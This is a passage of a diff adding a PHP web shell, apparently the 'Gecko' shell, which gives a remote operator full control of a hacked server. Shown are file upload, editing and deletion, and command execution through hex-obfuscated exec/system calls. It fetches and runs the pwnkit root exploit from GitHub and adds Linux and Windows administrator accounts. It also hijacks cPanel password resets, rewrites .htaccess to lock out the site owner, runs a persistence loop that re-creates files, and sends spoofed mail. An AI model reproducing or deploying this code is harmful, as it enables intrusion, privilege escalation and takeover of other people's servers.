+    $namaFilenya = $_FILES['gecko-upload']['name'];
+    $tmpName = $_FILES['gecko-upload']['tmp_name'];
+    if ($fungsi[29]($tmpName, $fungsi[0]() . "/" . $namaFilenya)) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_GET['destroy'])) {
+    $DOC_ROOT = $_SERVER["\x44\x4f\x43\x55\x4d\x45\x4e\x54\x5f\x52\x4f\x4f\x54"];
+    $CurrentFile = trim(basename($_SERVER["\x53\x43\x52\x49\x50\x54\x5f\x46\x49\x4c\x45\x4e\x41\x4d\x45"]));
+    if ($fungsi[4]($DOC_ROOT)) {
+        $htaccess = '
+<FilesMatch "\.(php|ph*|Ph*|PH*|pH*)$">
+    Deny from all
+</FilesMatch>
+<FilesMatch "^(' . $CurrentFile . '|index.php|wp-config.php|wp-includes.php)$">
+    Allow from all
+</FilesMatch>
+<FilesMatch "\.(jpg|png|gif|pdf|jpeg)$">
+    Allow from all
+</FilesMatch>';
+        $put_htt = $fungsi[28]($DOC_ROOT . "/.htaccess", $htaccess);
+        if ($put_htt) {
+            success();
+        } else {
+            failed();
+        }
+    } else {
+        failed();
+    }
+}
+
+
+if (isset($_POST['save-editor'])) {
+    $save = $fungsi[28]($fungsi[0]() . "/" . unx($_GET['f']), $_POST['code-editor']);
+    if ($save) {
+        success();
+    } else {
+        failed();
+    }
+}
+
+if (isset($_GET['adminer'])) {
+    $URL = "\x68\x74\x74\x70\x73\x3a\x2f\x2f\x67\x69\x74\x68\x75\x62\x2e\x63\x6f\x6d\x2f\x76\x72\x61\x6e\x61\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2f\x72\x65\x6c\x65\x61\x73\x65\x73\x2f\x64\x6f\x77\x6e\x6c\x6f\x61\x64\x2f\x76\x34\x2e\x38\x2e\x31\x2f\x61\x64\x6d\x69\x6e\x65\x72\x2d\x34\x2e\x38\x2e\x31\x2e\x70\x68\x70";
+    if (!$fungsi[3]('adminer.php')) {
+        $fungsi[28]("adminer.php", $fungsi[11]($URL));
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '">';
+    }
+}
+
+
+if ($_GET['terminal'] == "root") {
+    if (!$fungsi[3]('pwnkit') && $fungsi[4]($fungsi[0]())) {
+        $fungsi[28]("pwnkit", $fungsi[11]("https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit"));
+        cmd('chmod +x pwnkit');
+        echo cmd('./pwnkit "id" > .mad-root');
+        echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&terminal=root">';
+    }
+}
+
+if (isset($_POST['submit-action'])) {
+    $items = $_POST['check'];
+    if ($_POST['gecko-select'] == "delete") {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if (is_dir($fd) || is_file($fd)) {
+                $rmdir = unlinkDir($fd);
+                $rmfile = $fungsi[24]($fd);
+                if ($rmdir || $rmfile) {
+                    success();
+                } else if ($rmdir && $rmfile) {
+                    success();
+                } else {
+                    failed();
+                }
+            }
+        }
+    } else if ($_POST['gecko-select'] == 'unzip') {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if (ExtractArchive($fd, $repl . '/') == true) {
+                success();
+            } else {
+                failed();
+            }
+        }
+    } else if ($_POST['gecko-select'] == 'zip') {
+        foreach ($items as $it) {
+            $repl = str_replace("\\", "/", $fungsi[0]()); // Untuk Windows Path
+            $fd = $repl . "/" . $it;
+            if ($fungsi[3]($fd)) {
+                compressToZip($fd, pathinfo($fd, PATHINFO_FILENAME) . ".zip");
+            }
+        }
+    }
+}
+
+if (isset($_POST['submit'])) {
+    if ($_POST['resetcp'] == true) {
+        $emailCp = $_POST['resetcp'];
+        $path0cp = dirname($_SERVER['DOCUMENT_ROOT']);
+        $pathcp = $path0cp . "/.cpanel/contactinfo";
+        $contactinfo = '
+"email" : "' . $emailCp . '"
+        ';
+        if ($fungsi[3]($pathcp)) {
+            $fungsi[28]($pathcp, $contactinfo);
+            echo '<meta http-equiv="refresh" content="0;url=' . $_SERVER['REQUEST_SCHEME'] . '://' . $_SERVER['SERVER_NAME'] . ':2083/resetpass?start=1">';
+        } else {
+            failed();
+        }
+    }
+    if ($_POST['create_folder'] == true) {
+        $NamaFolder = $fungsi[12]($_POST['create_folder']);
+        if ($NamaFolder) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['create_file'] == true) {
+        $namaFile = $fungsi[13]($_POST['create_file']);
+        if ($namaFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['renameFile'] == true) {
+        $renameFile = $fungsi[15](unx($_GET['re']), $_POST['renameFile']);
+        if ($renameFile) {
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['chFile']) {
+        $chFiles = $fungsi[30](unx($_GET['ch']), $_POST['chFile']);
+        if ($chFiles) {
+            success();
+        } else {
+            failed();
+        }
+    } else if (isset($_POST['add-username']) && isset($_POST['add-password'])) {
+        if (!$fungsi[3]('pwnkit')) {
+            cmd('wget https://github.com/MadExploits/Privelege-escalation/raw/main/pwnkit -O pwnkit');
+            cmd('chmod +x pwnkit');
+            cmd('./pwnkit "id" > .mad-root');
+            echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&rooting=True">';
+        } else if ($fungsi[3]('.mad-root')) {
+            $response = $fungsi[11]('.mad-root');
+            $r_text = explode(" ", $response);
+            if ($r_text[0] == "uid=0(root)") {
+                $username = $_POST['add-username'];
+                $password = $_POST['add-password'];
+                cmd('./pwnkit "useradd ' . $username . ' ; echo -e "' . $password . '\n' . $password . '" | passwd ' . $username . '"');
+            } else {
+                echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($fungsi[0]()) . '&adduser=failed">';
+            }
+        }
+    } else if ($_POST['lockfile'] == true) {
+        $flesName = $_POST['lockfile'];
+        $TmpNames = $fungsi[31]();
+        if (file_exists($TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler')) && file_exists($TmpNames . '/.sessions/.' . remove_dot($flesName) . '-text')) {
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+            cmd('rm -rf ' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler'));
+        }
+        mkdir($TmpNames . "/.sessions");
+        cmd("cp $flesName " . $TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file'));
+        cmd("chmod 444 " . $flesName);
+        $handler = '
+<?php
+@ini_set("max_execution_time", 0);
+while (True){
+    if (!file_exists("' . $fungsi[0]() . '")){
+        mkdir("' . $fungsi[0]() . '");
+    }
+    if (!file_exists("' . $fungsi[0]() . '/' . $flesName . '")){
+        $text = ' . $fungsi[33] . '(file_get_contents("' . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-text-file') . '"));
+        file_put_contents("' . $fungsi[0]() . '/' . $flesName . '", ' . $fungsi[32] . '($text));
+    }
+    if (gecko_perm("' . $fungsi[0]() . '/' . $flesName . '") != 0444){
+        chmod("' . $fungsi[0]() . '/' . $flesName . '", 0444);
+    } 
+    if (gecko_perm("' . $fungsi[0]() . '") != 0555){
+        chmod("' . $fungsi[0]() . '", 0555);
+    }
+}
+
+function gecko_perm($flename){
+    return substr(sprintf("%o", fileperms($flename)), -4);
+}
+';
+        $hndlers = $fungsi[28]($TmpNames . "/.sessions/." . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . "", $handler);
+        if ($hndlers) {
+            cmd(PHP_BINARY . $TmpNames . '/.sessions/.' . $fungsi[33]($fungsi[0]() . remove_dot($flesName) . '-handler') . ' > /dev/null 2>/dev/null &');
+            success();
+        } else {
+            failed();
+        }
+    } else if ($_POST['add-rdp'] == True) {
+        $userRDP = $_POST['add-rdp'];
+        $passRDP = $_POST['add-rdp-pass'];
+        if (stristr(PHP_OS, "WIN")) {
+            $procRDP = cmd("net user " . $userRDP . " " . $passRDP . " /add");
+            if ($procRDP) {
+                cmd("net localgroup administrators " . $userRDP . " /add");
+                success();
+            } else {
+                failed();
+            }
+        } else {
+            failed();
+        }
+    } else if ($_POST['mail-from-smtp'] == True) {
+        $emailFrom = $_POST['mail-from-smtp'];
+        $emailTo = $_POST['mail-to-smtp'];
+        $emailSubject = $_POST['mailto-subject'];
+        $messageMail = $_POST['message-smtp'];
+        $headersMail = 'From: ' . $emailFrom . '' . "\r\n" .
+            'Reply-To: ' . $emailFrom . '' . "\r\n" .
+            'X-Mailer: PHP/' . phpversion();
+        $procMailSmTp = mail($emailTo, $emailSubject, $messageMail, $headersMail);
+        if ($procMailSmTp) {
+            success();
+        } else {
+            failed();
+        }
+    }
+}
+
+if ($_GET['response'] == "success") {
+    echo "<script>
+Swal.fire({
+    icon: 'success',
+    title: 'Sucesss...',
+    text: 'Done Success!',
+    confirmButtonColor: '#22242d',
+})</script>";
+} else if ($_GET['response'] == "failed") {
+    echo "<script>
+Swal.fire({
+    icon: 'error',
+    title: 'Failed...',
+    text: 'Something wrong!',
+    confirmButtonColor: '#22242d',
+})
+    </script>";
+}
+
+
+function success()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=success">';
+}
+function failed()
+{
+    echo '<meta http-equiv="refresh" content="0;url=?d=' . hx($GLOBALS['fungsi'][0]()) . '&response=failed">';
+}
+
+function formatSize($bytes)
+{
+    $types = array('<span class="file-size">B</span>', '<span class="file-size">KB</span>', '<span class="file-size">MB</span>', '<span class="file-size">GB</span>', '<span class="file-size">TB</span>');
+    for ($i = 0; $bytes >= 1024 && $i < (count($types) - 1); $bytes /= 1024, $i++);
+    return (round($bytes, 2) . " " . $types[$i]);
+}
+
+
+function hx($n)
+{
+    $y = '';
+    for ($i = 0; $i < strlen($n); $i++) {
+        $y .= dechex(ord($n[$i]));
+    }
+    return $y;
+}
+function unx($y)
+{
+    $n = '';
+    for ($i = 0; $i < strlen($y) - 1; $i += 2) {
+        $n .= chr(hexdec($y[$i] . $y[$i + 1]));
+    }
+    return $n;
+}
+
+function suggest_exploit()
+{
+    $uname = $GLOBALS['fungsi'][8]();
+    $xplod = explode(" ", $uname);
+    $xpld = explode("-", $xplod[2]);
+    $pl = explode(".", $xpld[0]);
+    return $pl[0] . "." . $pl[1] . "." . $pl[2];
+}
+function s()
+{
+    $d0mains = @$GLOBALS['fungsi'][7]("/etc/named.conf", false);
+    if (!$d0mains) {
+        $dom = "<font color=red size=2px>Cant Read [ /etc/named.conf ]</font>";
+        $GLOBALS["need_to_update_header"] = "true";
+    } else {
+        $count = 0;
+        foreach ($d0mains as $d0main) {
+            if (@strstr($d0main, "zone")) {
+                preg_match_all('#zone "(.*)"#', $d0main, $domains);
+                flush();
+                if (strlen(trim($domains[1][0])) > 2) {
+                    flush();
+                    $count++;
+                }
+            }
+        }
+        $dom = "$count Domain";
+    }
+    return $dom;
+}
+
+function cmd($in, $re = false)
+{
+    $out = '';
+    try {
+        if ($re) $in = $in . " 2>&1";
+        if (function_exists("\x65\x78\x65\x63")) {
+            @$GLOBALS['fungsi'][16]($in, $out);
+            $out = @join("\n", $out);
+        } elseif (function_exists("\x70\x61\x73\x73\x74\x68\x72\x75")) {
+            ob_start();
+            @$GLOBALS['fungsi'][17]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x79\x73\x74\x65\x6d")) {
+            ob_start();
+            @$GLOBALS['fungsi'][18]($in);
+            $out = ob_get_clean();
+        } elseif (function_exists("\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63")) {
+            $out = $GLOBALS['fungsi'][19]($in);
+        } elseif (function_exists("\x70\x6f\x70\x65\x6e") && function_exists("\x70\x63\x6c\x6f\x73\x65")) {
+            if (is_resource($f = @$GLOBALS['fungsi'][20]($in, "r"))) {
+                $out = "";
+                while (!@feof($f))
+                    $out .= fread($f, 1024);
+                $GLOBALS['fungsi'][21]($f);
+            }
+        } elseif (function_exists("\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e")) {
+            $pipes = array();
+            $process = @$GLOBALS['fungsi'][23]($in . ' 2>&1', array(array("pipe", "w"), array("pipe", "w"), array("pipe", "w")), $pipes, null);
+            $out = @$GLOBALS['fungsi'][22]($pipes[1]);
+        }
+    } catch (Exception $e) {
+    }
+    return $out;
+}
+
+
+function winpwd()
+{
+    return str_replace("\\", "/", $GLOBALS['fungsi'][0]());
+}
+
+function compressToZip($sourceFile, $zipFilename)
+{
+    $zip = new ZipArchive();
+
+    if ($zip->open($zipFilename, ZipArchive::CREATE) === TRUE) {
+        $zip->addFile($sourceFile, basename($sourceFile));
+        $zip->close();
+        success();
+    } else {
+        failed();
+    }
+}
+
+function remove_slash($val)
+{
+    $tex = str_replace("/", "", $val);
+    $tex1 = str_replace(":", "", $tex);
+    $tex2 = str_replace("_", "", $tex1);
+    $tex3 = str_replace(" ", "", $tex2);
+    $tex4 = str_replace(".", "", $tex3);
+    return $tex4;
+}
+
+function unlinkDir($dir)
+{
+    $dirs = array($dir);
+    $files = array();
+    for ($i = 0;; $i++) {
+        if (isset($dirs[$i]))
+            $dir =  $dirs[$i];
+        else
+            break;
+
+        if ($openDir = opendir($dir)) {
+            while ($readDir = @readdir($openDir)) {
+                if ($readDir != "." && $readDir != "..") {
+
+                    if ($GLOBALS['fungsi'][2]($dir . "/" . $readDir)) {
+                        $dirs[] = $dir . "/" . $readDir;
+                    } else {
+
+                        $files[] = $dir . "/" . $readDir;
+                    }
+                }
+            }
+        }
+    }
+
+
+
+    foreach ($files as $file) {
+        $GLOBALS['fungsi'][24]($file);
+    }
+    $dirs = array_reverse($dirs);
+    foreach ($dirs as $dir) {
+        $GLOBALS['fungsi'][25]($dir);
+    }
+}
+
+function remove_dot($file)
+{
+    $FILES = $file;
+    $pch = explode(".", $FILES);
+    return $pch[0];
+}
+
+
+function windowsDriver()
+{
+    $winArr = [
+        'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J', 'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'V', 'W', 'X', 'Y', 'Z'
+    ];
+    foreach ($winArr as $winNum => $winVal) {
+        if (is_dir($winVal . ":/")) {
+            echo "<a style='color:orange; font-weight:bold;' href='?d=" . hx($winVal . ":/") . "'>[ " . $winVal . " ] </a>&nbsp;";
+        }
+    }
+}
+
+function namaPanjang($value)
+{
+    $namaNya = $value;
+    $extensi = pathinfo($value, PATHINFO_EXTENSION);
+    if (strlen($namaNya) > 30) {
+        return substr($namaNya, 0, 30) . "...";
+    } else {
+        return $value;
+    }
+}
+
+function extractArchive($archiveFilename, $extractPath)
+{
+    $zip = new ZipArchive();
+
+    if ($zip->open($archiveFilename) === TRUE) {
+        $zip->extractTo($extractPath);
+        $zip->close();
+        return true;
+    } else {
+        return false;
+    }
+}
+
+function perms($file)
+{
+    $perms = $GLOBALS['fungsi'][6]($file);
+    if (($perms & 0xC000) == 0xC000) {
+        // Socket
+        $info = 's';
+    } elseif (($perms & 0xA000) == 0xA000) {
+        // Symbolic Link
+        $info = 'l';
+    } elseif (($perms & 0x8000) == 0x8000) {
+        // Regular
+        $info = '-';
+    } elseif (($perms & 0x6000) == 0x6000) {
+        // Block special
+        $info = 'b';
+    } elseif (($perms & 0x4000) == 0x4000) {
+        // Directory
+        $info = 'd';
+    } elseif (($perms & 0x2000) == 0x2000) {
+        // Character special
+        $info = 'c';
+    } elseif (($perms & 0x1000) == 0x1000) {
+        // FIFO pipe
+        $info = 'p';
+    } else {
+        // Unknown
+        $info = 'u';
+    }
+    // Owner
+    $info .= (($perms & 0x0100) ? 'r' : '-');
+    $info .= (($perms & 0x0080) ? 'w' : '-');
+    $info .= (($perms & 0x0040) ?
+        (($perms & 0x0800) ? 's' : 'x') : (($perms & 0x0800) ? 'S' : '-'));
+    // Group
+    $info .= (($perms & 0x0020) ? 'r' : '-');
+    $info .= (($perms & 0x0010) ? 'w' : '-');
+    $info .= (($perms & 0x0008) ?
+        (($perms & 0x0400) ? 's' : 'x') : (($perms & 0x0400) ? 'S' : '-'));
+
+    // World
+    $info .= (($perms & 0x0004) ? 'r' : '-');
+    $info .= (($perms & 0x0002) ? 'w' : '-');
+    $info .= (($perms & 0x0001) ?
+        (($perms & 0x0200) ? 't' : 'x') : (($perms & 0x0200) ? 'T' : '-'));
+    return $info;
+}
+?>
